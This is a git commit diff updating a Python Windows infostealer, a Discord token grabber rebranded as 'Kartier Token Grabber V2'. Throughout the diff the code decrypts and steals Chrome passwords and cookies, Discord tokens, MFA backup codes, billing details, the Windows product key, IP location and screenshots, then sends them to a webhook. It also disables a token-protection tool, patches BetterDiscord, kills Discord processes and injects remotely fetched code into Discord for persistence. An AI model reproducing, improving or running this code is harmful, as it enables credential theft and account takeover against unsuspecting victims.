8884883a892a5579fd5f363d2f68b65f2eb29ccd
jay4hunnid <97381602+jay4hunnid@users.noreply.github.com>
2022-03-07 22:24:00 -0800

    Update main.py

--- main.py
+++ main.py
@@ -8,18 +8,21 @@ import base64
 import psutil
 import winreg
 
+from threading import Thread
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 from re import findall
 from Crypto.Cipher import AES
 
-class Hazard_Token_Grabber_V2:
+class Kartier_Token_Grabber_V2:
     def __init__(self):
         self.webhook = "WEBHOOK_HERE"
         self.files = ""
+
+        self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
-        self.tempfolder = os.getenv("temp")+"\\Kartier_Token_Grabber_V2"  
+        self.tempfolder = os.getenv("temp")+"\\Kartier_Token_Grabber_V2"
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
 
         try:
@@ -31,29 +34,29 @@ class Hazard_Token_Grabber_V2:
         self.discord_psw = []
         self.backup_codes = []
         
-        if os.path.exists(self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"):
-            self.bypass_better_discord()
+        self.bypassBetterDiscord()
         self.bypassTokenProtector()
-        if not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data'):
+        if not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data') or not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Local State'):
             self.files += f"{os.getlogin()} doesn't have google installed\n"
         else:
             self.grabPassword()
             self.grabCookies()
+        t = Thread(target=self.screenshot)
+        t2 = Thread(target=self.killDiscord)
+        t.start();t.join()
+        t2.start();t2.join()
         self.grabTokens()
         self.neatifyTokens()
-        self.screenshot()
         for i in ["Google Passwords.txt", "Google Cookies.txt", "Discord Info.txt", "Discord backupCodes.txt"]:
             if os.path.exists(self.tempfolder+os.sep+i):
-                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as f:
-                    x = f.read()
-                    if x != "":
+                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as ff:
+                    x = ff.read()
+                    if not x:
                         with open(self.tempfolder+os.sep+i, "w", encoding="cp437") as f:
-                            f.write("Made by Kartierjay#0001 | https://discord.gg/zwpWPcHyjt\n\n")
+                            f.write("Made by Kartierjay#0001 | discord.gg/zwpWPcHyjt\n\n")
                         with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
-                            fp.write(x)
-                            fp.write("\n\nMade by Kartierjay#0001 | https://discord.gg/zwpWPcHyjt")
+                            fp.write(x+"\n\nMade by Kartierjay#0001 | discord.gg/zwpWPcHyjt")
                     else:
-                        f.close()
                         try:
                             os.remove(self.tempfolder+os.sep+i)
                         except Exception:
@@ -61,11 +64,8 @@ class Hazard_Token_Grabber_V2:
 
         self.SendInfo()
         self.Injection()
-        try:
-            shutil.rmtree(self.tempfolder)
-        except (PermissionError, FileNotFoundError):
-            pass
-
+        shutil.rmtree(self.tempfolder)
+        
     def getheaders(self, token=None, content_type="application/json"):
         headers = {
             "Content-Type": content_type,
@@ -76,20 +76,16 @@ class Hazard_Token_Grabber_V2:
         return headers
 
     def Injection(self):
-        for proc in psutil.process_iter():
-            if any(procstr in proc.name().lower() for procstr in\
-            ['discord', 'discordcanary', 'discorddevelopment', 'discordptb']):
-                try:
-                    proc.kill()
-                except psutil.NoSuchProcess:
-                    pass
         for root, dirs, files in os.walk(self.appdata):
             for name in dirs:
                 if "discord_desktop_core-" in name:
                     try:
                         directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
-                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Kartier"))
                     except FileNotFoundError:
+                        pass
+                    try:
+                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Kartier"))
+                    except FileExistsError:
                         pass
                     f = requests.get("https://raw.githubusercontent.com/jay4hunnid/injection-for-Kartier-Nuker/main/injection.py").text.replace("%WEBHOOK_LINK%", self.webhook)
                     with open(directory_list, 'w', encoding="utf-8") as index_file:
@@ -99,9 +95,7 @@ class Hazard_Token_Grabber_V2:
                 discord_file = os.path.join(root, name)
                 os.startfile(discord_file)
 
-    def bypassTokenProtector(self):
-        #fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
-        tp = f"{self.roaming}\\DiscordTokenProtector\\"
+    def killDiscord(self):
         for proc in psutil.process_iter():
             if any(procstr in proc.name().lower() for procstr in\
             ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
@@ -109,13 +103,18 @@ class Hazard_Token_Grabber_V2:
                     proc.kill()
                 except psutil.NoSuchProcess:
                     pass
+
+    def bypassTokenProtector(self):
+        #fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
+        tp = f"{self.roaming}\\DiscordTokenProtector\\"
+        config = tp+"config.json"
         for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
             try:
                 os.remove(tp+i)
             except Exception:
                 pass 
         try:
-            with open(tp+"config.json") as f:
+            with open(config) as f:
                 item = json.load(f)
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
@@ -131,49 +130,54 @@ class Hazard_Token_Grabber_V2:
                 item['iterations_key'] = 457
                 item['version'] = 69420
 
-            with open(tp+"config.json", 'w') as f:
+            with open(config, 'w') as f:
                 json.dump(item, f, indent=2, sort_keys=True)
 
-            with open(tp+"config.json", 'a') as f:
-                f.write("\n\n//Kartier just shit on this token protector | https://discord.gg/zwpWPcHyjt")
+            with open(config, 'a') as f:
+                f.write("\n\n//Kartier just shit on this token protector | blacked.com")
         except Exception:
             pass
 
-    def bypass_better_discord(self):
-        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
-        with open(bd, "rt", encoding="cp437") as f:
-            content = f.read()
-            content2 = content.replace("api/webhooks", "KartierTheGoat")
-        with open(bd, 'w'): pass
-        with open(bd, "wt", encoding="cp437") as f:
-            f.write(content2)
+    def bypassBetterDiscord(self):
+        if os.path.exists(self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"):
+            bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
+            with open(bd, "rt", encoding="cp437") as f:
+                content = f.read()
+                content2 = content.replace("api/webhooks", "KartierTheGoat")
+            open(bd, "w").close()
+            with open(bd, "wt", encoding="cp437") as f:
+                f.write(content2)
 
-    def getProductKey(self, path: str = 'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
+    def getProductKey(self, path: str = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
         def strToInt(x):
             if isinstance(x, str):
                 return ord(x)
             return x
         chars = 'BCDFGHJKMPQRTVWXY2346789'
-        result = ''
+        wkey = ''
         offset = 52
-        reg = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
-        val, _ = winreg.QueryValueEx(reg, 'DigitalProductID')
+        regkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
+        val, _ = winreg.QueryValueEx(regkey, 'DigitalProductId')
+        productName, _ = winreg.QueryValueEx(regkey, "ProductName")
         key = list(val)
-    
+
         for i in range(24,-1, -1):
             temp = 0
             for j in range(14,-1,-1):
                 temp *= 256
-                temp += strToInt(key[j+ offset])
+                try:
+                    temp += strToInt(key[j+ offset])
+                except IndexError:
+                    return [productName, ""]
                 if temp / 24 <= 255:
                     key[j+ offset] = temp/24
                 else:
                     key[j+ offset] = 255
                 temp = int(temp % 24)
-            result = chars[temp] + result
-        for i in range(5,len(result),6):
-            result = result[:i] + '-' + result[i:]
-        return result
+            wkey = chars[temp] + wkey
+        for i in range(5,len(wkey),6):
+            wkey = wkey[:i] + '-' + wkey[i:]
+        return [productName, wkey]
 
     def get_master_key(self):
         with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
@@ -199,7 +203,7 @@ class Hazard_Token_Grabber_V2:
             decrypted_pass = self.decrypt_payload(cipher, payload)
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
-        except:
+        except Exception:
             return "Failed to decrypt password"
     
     def grabPassword(self):
@@ -223,13 +227,13 @@ class Hazard_Token_Grabber_V2:
                         f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
                         if "discord" in url.lower():
                             self.discord_psw.append(decrypted_password)
-            except:
+            except Exception:
                 pass
         cursor.close()
         conn.close()
         try:
             os.remove("Loginvault.db")
-        except:
+        except Exception:
             pass
 
     def grabCookies(self):
@@ -245,19 +249,19 @@ class Hazard_Token_Grabber_V2:
             try:
                 cursor.execute("SELECT host_key, name, encrypted_value from cookies")
                 for r in cursor.fetchall():
-                    Host = r[0]
+                    host = r[0]
                     user = r[1]
                     encrypted_cookie = r[2]
                     decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
-                    if Host != "":
-                        f.write(f"Host: {Host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
-            except:
+                    if host != "":
+                        f.write(f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
+            except Exception:
                 pass
         cursor.close()
         conn.close()
         try:
             os.remove("Loginvault.db")
-        except:
+        except Exception:
             pass
 
     def grabTokens(self):
@@ -296,12 +300,12 @@ class Hazard_Token_Grabber_V2:
                     for regex in (self.regex):
                         for token in findall(regex, line):
                             try:
-                                r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
+                                r = requests.get(self.baseurl, headers=self.getheaders(token))
+                                if r.status_code == 200:
+                                    if token in self.tokens:
+                                        continue
                             except Exception:
                                 pass
-                            if r.status_code == 200:
-                                if token in self.tokens:
-                                    continue
                                 self.tokens.append(token)
         if os.path.exists(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
             for path, subdirs, files in os.walk(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
@@ -312,7 +316,7 @@ class Hazard_Token_Grabber_V2:
                         for regex in (self.regex):
                             for token in findall(regex, line):
                                 try:
-                                    r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
+                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
                                 except Exception:
                                     pass
                                 if r.status_code == 200:
@@ -324,7 +328,7 @@ class Hazard_Token_Grabber_V2:
         f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
         for token in self.tokens:
             try:
-                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
+                j = requests.get(self.baseurl, headers=self.getheaders(token)).json()
             except Exception:
                 pass
             user = j["username"] + "#" + str(j["discriminator"])
@@ -334,7 +338,7 @@ class Hazard_Token_Grabber_V2:
                     fp.write(f"{user} Backup Codes".center(36, "-")+"\n")
                     for x in self.discord_psw:
                         try:
-                            r = requests.post("https://discord.com/api/v9/users/@me/mfa/codes", headers=self.getheaders(token), json={"password": x, "regenerate": False}).json()
+                            r = requests.post(self.baseurl+"/mfa/codes", headers=self.getheaders(token), json={"password": x, "regenerate": False}).json()
                             for i in r["backup_codes"]:
                                 if i not in self.backup_codes:
                                     self.backup_codes.append(i)
@@ -358,13 +362,13 @@ class Hazard_Token_Grabber_V2:
             email = j["email"]
             phone = j["phone"] if j["phone"] else "No Phone Number attached"
             try:
-                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
+                nitro_data = requests.get(self.baseurl+'/billing/subscriptions', headers=self.getheaders(token)).json()
             except Exception:
                 pass
             has_nitro = False
             has_nitro = bool(len(nitro_data) > 0)
             try:
-                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
+                billing = bool(len(json.loads(requests.get(self.baseurl+"/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
             except Exception:
                 pass
             f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
@@ -381,10 +385,11 @@ class Hazard_Token_Grabber_V2:
         image.close()
 
     def SendInfo(self):
-        wkey = self.getProductKey()
+        wname = self.getProductKey()[0]
+        wkey = self.getProductKey()[1]
         ip = country = city = region = googlemap = "None"
         try:
-            data = requests.get("http://ipinfo.io/json").json()
+            data = requests.get("https://ipinfo.io/json").json()
             ip = data['ip']
             city = data['city']
             country = data['country']
@@ -405,7 +410,6 @@ class Hazard_Token_Grabber_V2:
         for f in files:
             self.files += f"\n{f}"
         self.fileCount = f"{len(files)} Files Found: "
-        backslash = "\n"
         embed = {
             "avatar_url":"https://cdn.discordapp.com/attachments/857823662802468874/936508525557981264/ezgif-5-5cc2f16e09.gif",
             "embeds": [
@@ -415,7 +419,7 @@ class Hazard_Token_Grabber_V2:
                         "url": "https://discord.gg/zwpWPcHyjt",
                         "icon_url": "https://cdn.discordapp.com/attachments/857823662802468874/936506794816200784/ezgif-5-8b7c47f1b0.gif"
                     },
-                    "description": f'**{os.getlogin()}** Just ran Kartier Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}{backslash+"Windows Key: "+wkey if wkey else ""}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
+                    "description": f'**{os.getlogin()}** Just ran Kartier Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
                     "color": 16119101,
 
                     "thumbnail": {
@@ -433,4 +437,4 @@ class Hazard_Token_Grabber_V2:
         os.remove(_zipfile)
 
 if __name__ == "__main__":
-    Hazard_Token_Grabber_V2()
+    Kartier_Token_Grabber_V2()
